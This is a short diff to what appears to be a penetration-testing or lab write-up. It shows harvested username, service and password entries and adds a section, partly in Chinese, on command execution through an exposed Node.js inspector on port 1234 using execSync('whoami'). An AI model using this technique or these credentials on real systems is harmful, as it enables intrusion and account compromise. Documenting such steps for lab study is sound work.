@@ -191,3 +191,13 @@ duke|work|f0f7f79a275a83bfe8769dfd81d40bb2
 duke|Windows|pass123
 sam|Facebook|Test123!
 ```
+
+## Port 1234 node inspect
+
+可能通过 console 命令实现任意命令执行
+
+```plaintext
+debug> repl
+Press Ctrl+C to leave debug repl
+> require('child_process').execSync('whoami').toString()
+```
